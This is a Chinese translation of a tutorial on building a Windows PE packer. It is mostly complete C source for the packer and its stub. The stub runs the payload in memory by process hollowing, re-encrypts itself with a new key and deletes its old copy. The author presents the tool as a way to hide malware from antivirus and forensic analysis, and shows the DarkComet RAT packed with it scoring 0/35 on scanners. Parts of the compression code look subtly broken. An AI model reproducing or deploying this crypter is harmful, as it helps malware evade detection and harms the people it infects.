> 原文链接: https://www.anquanke.com//post/id/90173 


# 深入分析PE可执行文件是如何进行加壳和数据混淆的


                                阅读量   
                                **144697**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者dtm，文章来源：0x00sec.org
                                <br>原文地址：[https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847](https://0x00sec.org/t/packers-executable-compression-and-data-obfuscation/847)

译文仅供参考，具体内容表达以及含义原文为准

> 在本文，我们将以一个可执行文件的压缩过程为例，详细讲解我在过去的两天之中时如何对它进行加壳的。就像是Crypters一样，我认为这一过程仿佛是地下社团开展的某种暗黑艺术。尽管目前，存在着很多可以公开的加壳器（Packer，例如UPX、Themida等），但我还没有看到过有讲解如何编写它们的文章。正巧，我前几天阅读了Gunther写的《C83中如何写一个简单的可执行文件加壳器》，受这篇文章的启发，我开始进一步研究这个神秘的话题。通过阅读这篇文章，我希望大家能够至少对这些主流加壳工具的功能有所理解。

**要阅读本文，可能需要大量的Windows编程知识，需要读者具有以下基础：**

**1. 熟练使用C/C++；**

**2. 了解WinAPI及其官方文档；**

**3. 具备基本的密码学知识；**

**4. 具有文件压缩的相关知识；**

**5. 了解PE文件结构。**

 

## 关于加壳器

**所谓加壳器，是利用其特殊优势，借助压缩以混淆数据等方式，防止诸如反汇编之类的逆向工程的一种工具。**由于其具有数据混淆的特性，所以恶意软件开发者会利用它，将恶意代码隐藏在可执行文件之中，逃避反病毒软件的检测。这种行为就像是对混淆后的数据进行了一次加密。同时，在进一步进行压缩的过程中，加壳器还可以利用一些加密方法，来提供双层混淆。让我们首先来看看某个可执行文件的压缩过程，我们会以直观的方式来展现：

**加壳器负责压缩（和加密）Payload。**

[![](https://p1.ssl.qhimg.com/t0127b0aee9bc177d52.png)](https://p1.ssl.qhimg.com/t0127b0aee9bc177d52.png)

**壳（Stub）是可执行文件的一部分，其作用在于提取（解密、解压缩）Payload，以供执行。**

[![](https://p5.ssl.qhimg.com/t01b5d78c0faf6564a8.png)](https://p5.ssl.qhimg.com/t01b5d78c0faf6564a8.png)

 

## 如何编写加壳器

加壳器需要压缩并加密Payload，然后将其添加到壳中。下面展示了一个可行的加壳器设计方案。

加壳器的伪代码（算法描述语言）如下：

**第一步：将Payload文件读入缓冲区；**

**第二步：使用指向缓冲区的指针及其原大小来更新结构；**

**第三步：压缩Payload缓冲区；**

**第四步：加密缓冲区；**

**第五步：创建壳（Stub）输出文件；**

**第六步：通过添加Payload缓冲区来更新壳。**

以下是该方案对应的具体代码：

```
#include &lt;stdio.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;windows.h&gt;
#include &lt;wincrypt.h&gt;
#include &lt;zlib.h&gt;
#include "resource.h"
#define WIN32_LEAN_AND_MEAN
#define DEBUG
#define DEBUG_TITLE "STUB - DEBUG MESSAGE"
#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30
#define KEY_LEN 64
typedef struct _FileStruct `{`
    PBYTE pBuffer;
    DWORD dwBufSize;
    DWORD dwFileSize;
    PBYTE pKey;
`}` FileStruct, *pFileStruct;
VOID Debug(LPCSTR fmt, ...) `{`
#ifdef DEBUG
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
#endif
`}`
FileStruct *LoadFile(LPCSTR szFileName) `{`
    Debug("Loading %s...n", szFileName);
    Debug("Initializing struct...n");
    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
    if (fs == NULL) `{`
        Debug("Create %s file structure error: %lun", szFileName, GetLastError());
        return NULL;
    `}`
    Debug("Initializing file...n");
    // get file handle to file
    HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) `{`
        Debug("Create file error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    // get file size
    Debug("Retrieving file size...n");
    fs-&gt;dwFileSize = GetFileSize(hFile, NULL);
    if (fs-&gt;dwFileSize == INVALID_FILE_SIZE) `{`
        Debug("Get file size error: %lun", GetLastError());
        CloseHandle(hFile);
        free(fs);
        return NULL;
    `}`
    fs-&gt;dwBufSize = fs-&gt;dwFileSize;
    // create heap buffer to hold file contents
    fs-&gt;pBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
    if (fs-&gt;pBuffer == NULL) `{`
        Debug("Create buffer error: %lun", GetLastError());
        CloseHandle(hFile);
        free(fs);
        return NULL;
    `}`
    // read file contents
    Debug("Reading file contents...n");
    DWORD dwRead = 0;
    if (ReadFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwRead, NULL) == FALSE) `{`
        Debug("Read file error: %lun", GetLastError());
        CloseHandle(hFile);
        free(fs);
        return NULL;
    `}`
    Debug("Read 0x%08x bytesnn", dwRead);
    // clean up
    CloseHandle(hFile);
    return fs;
`}`
BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs) `{`
    // start updating stub's resources
    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
    // add file as a resource to stub
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) `{`
        Debug("Update resource error: %lun", GetLastError());
        return FALSE;
    `}`
    // add file size as a resource to stub
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PVOID)&amp;fs-&gt;dwFileSize, sizeof(DWORD)) == FALSE) `{`
        Debug("Update resource error: %lun", GetLastError());
        return FALSE;
    `}`
    // add decryption key as a resource
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) `{`
        Debug("Update resource error: %lun", GetLastError());
        return FALSE;
    `}`
    EndUpdateResource(hUpdate, FALSE);
    return TRUE;
`}`
BOOL BuildStub(LPCSTR szFileName, FileStruct *fs) `{`
    Debug("Building stub: %s...n", szFileName);
    // get stub program as a resource
    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
    if (hRsrc == NULL) `{`
        Debug("Find stub resource error: %lun", GetLastError());
        return FALSE;
    `}`
    DWORD dwSize = SizeofResource(NULL, hRsrc);
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) `{`
        Debug("Load stub resource error: %lun", GetLastError());
        return FALSE;
    `}`
    // get stub's file content
    PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
    if (pBuffer == NULL) `{`
        Debug("Lock stub resource error: %lun", GetLastError());
        return FALSE;
    `}`
    // create output file
    Debug("Creating stub...n");
    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) `{`
        Debug("Create stub error: %lun", GetLastError());
        free(pBuffer);
        return FALSE;   
    `}`
    // write stub content to output file
    Debug("Writing payload to stub...n");
    DWORD dwWritten = 0;
    if (WriteFile(hFile, pBuffer, dwSize, &amp;dwWritten, NULL) == FALSE) `{`
        Debug("Write payload to stub error: %lun", GetLastError());
        CloseHandle(hFile);
        free(pBuffer);
        return FALSE;
    `}`
    Debug("Wrote 0x%08x bytesnn");
    CloseHandle(hFile);
    // add payload to stub
    Debug("Updating stub with payload...n");
    if (UpdateStub(szFileName, fs) == FALSE)
        return FALSE;
    return TRUE;
`}`
BOOL GenerateKey(FileStruct *fs) `{`
    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
    if (fs-&gt;pKey == NULL) return FALSE;
    // initialize crypto service provider
    HCRYPTPROV hProv = NULL;
    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) `{`
        Debug("Crypt aquire context error: %lun", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    `}`
    // generate secure bytes
    Debug("Generating cryptographically secure bytes...n");
    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) `{`
        Debug("Generate random key error: %lun", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    `}`
    Debug("Using key: ");
    for (int i = 0; i &lt; KEY_LEN; i++)
        Debug("0x%02x ", fs-&gt;pKey[i]);
    Debug("n");
    // clean up
    CryptReleaseContext(hProv, 0);
    return TRUE;
`}`
// XOR
BOOL EncryptPayload(FileStruct *fs) `{`
    Debug("EncryptPayloading payload...n");
    Debug("Generating key...n");
    if (GenerateKey(fs) == FALSE) return FALSE;
    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
        fs-&gt;pBuffer[i] ^= fs-&gt;pKey[i % KEY_LEN];
    Debug("EncryptPayloadion routine completen");
    return TRUE;
`}`
BOOL CompressPayload(FileStruct *fs) `{`
    Debug("Compressing payload...n");
    PBYTE pCompressedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
    ULONG ulCompressedBufSize = compressBound((ULONG)fs-&gt;dwBufSize);
    compress(pCompressedBuffer, &amp;ulCompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwBufSize);
    fs-&gt;pBuffer = pCompressedBuffer;
    fs-&gt;dwBufSize = ulCompressedBufSize;
    Debug("Compression routine completen");
    return TRUE;
`}`
int main(int argc, char *argv[]) `{`
    printf("Copyright (C) 2016  93aef0ce4dd141ece6f5nn");
    if (argc &lt; 3) `{`
        Debug("Usage: %s [INPUT FILE] [OUTPUT FILE]n", argv[0]);
        return 1;
    `}`
    FileStruct *fs = LoadFile(argv[1]);
    if (fs == NULL) return 1;
    Debug("Applying obfuscation...n");
    if (CompressPayload(fs) == FALSE) `{`
        free(fs);
        return 1;
    `}`
    if (EncryptPayload(fs) == FALSE) `{`
        free(fs);
        return 1;
    `}`
    Debug("n");
    if (BuildStub(argv[2], fs) == FALSE) `{`
        free(fs-&gt;pKey);
        free(fs);
        return 1;
    `}`
    // clean up
    free(fs-&gt;pKey);
    free(fs);
    Debug("nDonen");
    return 0;
`}`
```

其中，CompressPayload函数使用了zLib第三方压缩库，以在Payload缓冲区上进行压缩操作。

EncryptPayload函数则简单地使用了XOR的加密方式作为示例。在实际应用中，大家完全可以使用RC4或者AES之类的加密方式来替代XOR。该函数中还有一个GenerateKey函数，在每次程序执行时，它都会借助WinAPI的密码库（Cryptography Library），通过使用CSPRNG，来生成唯一的32位长度密钥。

BuildStub函数负责在壳中创建并添加资源。这些资源时存储在_FileStruct文件结构中的信息，是在壳本身的例程中所必须的。这些资源将会在壳代码被覆盖之后直观地展示出来。

## 

## 如何编写壳

壳的作用在于提取并执行Payload。我们需要注意的是，壳所执行的，是加壳器所执行的反向操作。下面是一个可行的设计方案。

壳的伪代码如下：

**第一步：提取资源；**

**第二步：解密Payload缓冲区；**

**第三步：解压缩缓冲区；**

**第四步：放置Payload；**

**第五步：执行Payload。**

以下是该方案对应的具体代码：

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;windows.h&gt;
#include &lt;wincrypt.h&gt;
#include &lt;zlib.h&gt;
#define WIN32_LEAN_AND_MEAN
#define DEBUG
#define DEBUG_TITLE "STUB - DEBUG MESSAGE"
#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30
#define KEY_LEN 64
typedef VOID(*PZUVOS)(HANDLE, PVOID);

typedef struct _FileStruct `{`
    PBYTE pBuffer;
    DWORD dwBufSize;
    DWORD dwFileSize;
    PBYTE pKey;
`}` FileStruct, *pFileStruct;
VOID Debug(LPCSTR fmt, ...) `{`
#ifdef DEBUG
    CHAR szDebugBuf[BUFSIZ];
    va_list args;
    va_start(args, fmt);
    vsprintf(szDebugBuf, fmt, args);
    MessageBox(NULL, szDebugBuf, DEBUG_TITLE, MB_OK);
    va_end(args);
#endif
`}`
FileStruct *ExtractPayload(VOID) `{`
    FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
    if (fs == NULL) return NULL;
    // get file buffer
    // get size of resource
    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(BUFFER_RSRC_ID), RT_RCDATA);
    if (hRsrc == NULL) `{`
        Debug("Find buffer resource error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    fs-&gt;dwBufSize = SizeofResource(NULL, hRsrc);
    // get pointer to resource buffer
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) `{`
        Debug("Load buffer resource error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    fs-&gt;pBuffer = (PBYTE)LockResource(hGlobal);
    if (fs-&gt;pBuffer == NULL) `{`
        Debug("Lock buffer resource error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    // get actual file size resource
    hRsrc = FindResource(NULL, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), RT_RCDATA);
    if (hRsrc == NULL) `{`
        Debug("Find file size error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    // get file size value
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) `{`
        Debug("Load buffer resource error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    fs-&gt;dwFileSize = *(LPDWORD)LockResource(hGlobal);
    // get decryption key
    hRsrc = FindResource(NULL, MAKEINTRESOURCE(KEY_RSRC_ID), RT_RCDATA);
    if (hRsrc == NULL) `{`
        Debug("Find key resource error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    // get pointer to key buffer
    hGlobal = LoadResource(NULL, hRsrc);
    if (hGlobal == NULL) `{`
        Debug("Load key resource error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    fs-&gt;pKey = (PBYTE)LockResource(hGlobal);
    if (fs-&gt;pKey == NULL) `{`
        Debug("Lock buffer resource error: %lun", GetLastError());
        free(fs);
        return NULL;
    `}`
    return fs;
`}`
BOOL UpdateResources(FileStruct *fs, LPCSTR szFileName) `{`
    HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
    // add file as a resource to stub
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pBuffer, fs-&gt;dwBufSize) == FALSE) `{`
        Debug("Update resource error: %lun", GetLastError());
        return FALSE;
    `}`
    // add decryption key as a resource
    if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs-&gt;pKey, KEY_LEN) == FALSE) `{`
        Debug("Update resource error: %lun", GetLastError());
        return FALSE;
    `}`
    if (EndUpdateResource(hUpdate, FALSE) == FALSE) `{`
        Debug("End update resource error: %lun", GetLastError());
    `}`
    return TRUE;
`}`
BOOL GenerateKey(FileStruct *fs) `{`
    fs-&gt;pKey = (PBYTE)malloc(KEY_LEN);
    if (fs-&gt;pKey == NULL) return FALSE;
    // initialize crypto service provider
    HCRYPTPROV hProv = NULL;
    if (CryptAcquireContext(&amp;hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) `{`
        Debug("Crypt aquire context error: %lun", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    `}`
    // generate secure bytes
    //Debug("Generating cryptographically secure bytes...n");
    if (CryptGenRandom(hProv, KEY_LEN, fs-&gt;pKey) == FALSE) `{`
        Debug("Generate random key error: %lun", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    `}`
    /*
    Debug("Using key: ");
    for (int i = 0; i &lt; KEY_LEN; i++)
        Debug("0x%02x ", fs-&gt;pKey[i]);
    Debug("n");
    */
    // clean up
    CryptReleaseContext(hProv, 0);
    return TRUE;
`}`
// XOR
BOOL DecryptPayload(FileStruct *fs) `{`
    PBYTE pDecryptPayloadedBuffer = (PBYTE)malloc(fs-&gt;dwBufSize);
    if (pDecryptPayloadedBuffer == NULL) return FALSE;
    for (DWORD i = 0; i &lt; fs-&gt;dwBufSize; i++)
        pDecryptPayloadedBuffer[i] = fs-&gt;pBuffer[i] ^ fs-&gt;pKey[i % KEY_LEN];
    fs-&gt;pBuffer = pDecryptPayloadedBuffer;
    return TRUE;
`}`
// XOR
BOOL Encrypt(FileStruct *fs) `{`
    return DecryptPayload(fs);
`}`
BOOL DecompressPayload(FileStruct *fs) `{`
    PBYTE pDecompressedBuffer = (PBYTE)malloc(fs-&gt;dwFileSize);
    ULONG ulDecompressedBufSize;
    uncompress(pDecompressedBuffer, &amp;ulDecompressedBufSize, fs-&gt;pBuffer, fs-&gt;dwFileSize);
    fs-&gt;pBuffer = pDecompressedBuffer;
    fs-&gt;dwBufSize = ulDecompressedBufSize;
    return TRUE;
`}`
VOID DropAndExecutePayload(FileStruct *fs, LPCSTR szFileName) `{`
    DWORD dwWritten;
    HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, fs-&gt;pBuffer, fs-&gt;dwFileSize, &amp;dwWritten, NULL);
    CloseHandle(hFile);
    ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
`}`
BOOL MemoryExecutePayload(FileStruct *fs) `{`
    // PE headers
    PIMAGE_DOS_HEADER pidh;
    PIMAGE_NT_HEADERS pinh;
    PIMAGE_SECTION_HEADER pish;
    // process info
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    // pointer to virtually allocated memory
    LPVOID lpAddress = NULL;
    // context of suspended thread for setting address of entry point
    CONTEXT context;
    // need function pointer for ZwUnmapViewOfSection from ntdll.dll
    PZUVOS pZwUnmapViewOfSection = NULL;
    // get file name
    CHAR szFileName[MAX_PATH];
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    // first extract header info
    // check if valid DOS header
    pidh = (PIMAGE_DOS_HEADER)fs-&gt;pBuffer;
    if (pidh-&gt;e_magic != IMAGE_DOS_SIGNATURE) `{`
        Debug("DOS signature error");
        return FALSE;
    `}`
    // check if valid pe file
    pinh = (PIMAGE_NT_HEADERS)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew);
    if (pinh-&gt;Signature != IMAGE_NT_SIGNATURE) `{`
        Debug("PE signature error");
        return FALSE;
    `}`
    // first create process as suspended
    memset(&amp;si, 0, sizeof(si));
    memset(&amp;pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    if (CreateProcess(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi) == FALSE) `{`
        Debug("Create process error %lun", GetLastError());
        return FALSE;
    `}`
    context.ContextFlags = CONTEXT_FULL;
    if (GetThreadContext(pi.hThread, &amp;context) == FALSE) `{`
        Debug("Get thread context");
    `}`
    // unmap memory space for our process
    pZwUnmapViewOfSection = (PZUVOS)GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwUnmapViewOfSection");
    pZwUnmapViewOfSection(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase);
    // allocate virtual space for process
    lpAddress = VirtualAllocEx(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, pinh-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpAddress == NULL) `{`
        Debug("Virtual alloc error: %lun", GetLastError());
        return FALSE;
    `}`
    // write headers into memory
    if (WriteProcessMemory(pi.hProcess, (PVOID)pinh-&gt;OptionalHeader.ImageBase, fs-&gt;pBuffer, pinh-&gt;OptionalHeader.SizeOfHeaders, NULL) == FALSE) `{`
        Debug ("Write headers error: %lun", GetLastError());
        return FALSE;
    `}`
    // write each section into memory
    for (int i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) `{`
        // calculate section header of each section
        pish = (PIMAGE_SECTION_HEADER)((DWORD)fs-&gt;pBuffer + pidh-&gt;e_lfanew + sizeof (IMAGE_NT_HEADERS) + sizeof (IMAGE_SECTION_HEADER) * i);
        // write section data into memory
        WriteProcessMemory(pi.hProcess, (PVOID)(pinh-&gt;OptionalHeader.ImageBase + pish-&gt;VirtualAddress), (LPVOID)((DWORD)fs-&gt;pBuffer + pish-&gt;PointerToRawData), pish-&gt;SizeOfRawData, NULL);
    `}`
    // set starting address at virtual address: address of entry point
    context.Eax = pinh-&gt;OptionalHeader.ImageBase + pinh-&gt;OptionalHeader.AddressOfEntryPoint;
    if (SetThreadContext(pi.hThread, &amp;context) == FALSE) `{`
        Debug("Set thread context error: %lun", GetLastError());
        return FALSE;
    `}`
    // resume our suspended processes
    if (ResumeThread(pi.hThread) == -1) `{`
        Debug("Resume thread error: %lun", GetLastError());
        return FALSE;
    `}`
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
`}`
/*
VOID RunFromMemory(FileStruct *fs) `{`
    Debug("%p", fs-&gt;pBuffer);
    HMEMORYMODULE hModule = MemoryLoadLibrary(fs-&gt;pBuffer, fs-&gt;dwFileSize);
    if (hModule == NULL) `{`
        Debug("Memory load library error: %lun", GetLastError());
        return;
    `}`
    int nSuccess = MemoryCallEntryPoint(hModule);
    if (nSuccess &lt; 0) `{`
        Debug("Memory call entry point error: %dn", nSuccess);
    `}`
    MemoryFreeLibrary(hModule);
`}`
*/
VOID SelfDelete(LPCSTR szFileName) `{`
    PROCESS_INFORMATION pi = `{` 0 `}`;
    STARTUPINFO si = `{` 0 `}`;
    si.cb = sizeof(si);
    //CreateFile("old.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
    CHAR szCmdLine[MAX_PATH];
    sprintf(szCmdLine, "%s delete", szFileName);
    if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi) == FALSE) `{`
        Debug("Create process error: %lun", GetLastError());
    `}`
`}`
BOOL PolymorphPayload(LPCSTR szFileName) `{`
    MoveFile(szFileName, "old.exe");
    CopyFile("old.exe", szFileName, FALSE);
    // re-extract resources
    FileStruct *fs = ExtractPayload();
    if (fs == NULL) return FALSE;
    // decrypt buffer
    if (DecryptPayload(fs) == FALSE) `{`
        Debug("DecryptPayload buffer error: %lun", GetLastError());
        free(fs);
        return FALSE;
    `}`
    // generate new key
    if (GenerateKey(fs) == FALSE) `{`
        Debug("Generate key error: %lun", GetLastError());
        free(fs);
        return FALSE;
    `}`
    // encrypt with new key
    if (Encrypt(fs) == FALSE) `{`
        Debug("Encrypt buffer error: %lun", GetLastError());
        free(fs-&gt;pKey);
        return FALSE;
    `}`
    // update resources
    if (UpdateResources(fs, szFileName) == FALSE) `{`
        free(fs-&gt;pKey);
        free(fs);
        return FALSE;
    `}`
    SelfDelete(szFileName);
    free(fs-&gt;pKey);
    free(fs);
    return TRUE;
`}`
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) `{`
    if (strstr(GetCommandLine(), "delete") != NULL) `{`
        while (DeleteFile("old.exe") == FALSE);
    `}` else `{`
        FileStruct *fs = ExtractPayload();
        if (fs == NULL) `{`
            Debug("Extract file error: %lun", GetLastError());
            return 1;
        `}`
        if (DecryptPayload(fs) == TRUE) `{`
            if (DecompressPayload(fs) == TRUE)
                //DropAndExecutePayload(fs, "test.exe");
                MemoryExecutePayload(fs);
        `}`
        free(fs-&gt;pBuffer);
        free(fs);
        CHAR szFileName[MAX_PATH];
        GetModuleFileName(NULL, szFileName, MAX_PATH);
        PolymorphPayload(szFileName);
    `}`
    return 0;
`}`
```

壳的原理非常简单，就是执行加壳器的反向操作。当它将必要信息从资源中提取到结构之中后，首先会进行解密，随后通过使用DecryptPayload和DecompressPayload函数来解压缩缓冲区，以实现对Payload进行反混淆。在成功进行反混淆操作后，壳会将可执行文件放在同一个目录中，并执行该文件。在这里，我们如果使用RunPE或者Dynamic Forking的方法，就可以消除磁盘活动记录，以阻止恶意软件被取证。



## 资源及PE文件的格式

以下是针对文件中的资源，进行的一个简要文件分析：

[![](https://p0.ssl.qhimg.com/t01e116f44770fb0975.png)](https://p0.ssl.qhimg.com/t01e116f44770fb0975.png)

其中箭头所指的就是资源段（.rsrc），其中的内容就是添加到二进制文件中的资源。左边红色方框中的标签，代表着PE文件中存在的不同资源。目前，PEView可以显示资源ID为000A的RCDATA（原始数据），从上面的代码中我们可以看出，它其实是混淆后的Payload。

这是XOR加密方式的32字节密钥。

[![](https://p4.ssl.qhimg.com/t01c4dd5c4baf8af256.png)](https://p4.ssl.qhimg.com/t01c4dd5c4baf8af256.png)

 

## 演示

下面是一个使用putty.exe作为Payload的简单演示。

首先，启动加壳器，创建壳，并且对Payload进行混淆。

[![](https://p4.ssl.qhimg.com/t01b3ab9e63c61bfa43.png)](https://p4.ssl.qhimg.com/t01b3ab9e63c61bfa43.png)

目前，putty.exe的大小是512KB，其中的壳大小为318KB。现在，我们就可以启动生成的壳。

[![](https://p1.ssl.qhimg.com/t01a747f17f500fbab1.png)](https://p1.ssl.qhimg.com/t01a747f17f500fbab1.png)

如上图所示，它产生了反混淆后的Payload——test.exe并执行。



## 后续开发工作

后来，我增加了直接从内存中执行有包装的Payload的功能。具体而言，我将RunPE中的方法添加到了我的加壳器之中，并且使用MinGW编译，结果证明它可以完美地运行。下面是Dark Comet远控木马加壳后扫描的结果。

Majyx检测平台（0/35）：

[![](https://p5.ssl.qhimg.com/t0120e238ee2e6c357e.png)](https://p5.ssl.qhimg.com/t0120e238ee2e6c357e.png)

NoDistribute检测平台（0/35）：

[![](https://p0.ssl.qhimg.com/t017f493687b72cb9d0.png)](https://p0.ssl.qhimg.com/t017f493687b72cb9d0.png)

同时，我还增加了对于Polymorph方式包装Payload的支持。概括来说，就是用一个新的密钥来重新加密压缩的Payload。



## 结语

在我的研究过程中，遇到的唯一一个困难就是如何去理解资源管理（Resource Management）。除此之外，涉及到的内容都相对简单。我已经将涉及到的文件上传至[我的GitHub中](https://github.com/93aef0ce4dd141ece6f5/Packer)，其中包括一个已经编译好的32位可执行文件，供大家参考。

最后，感谢大家的阅读。
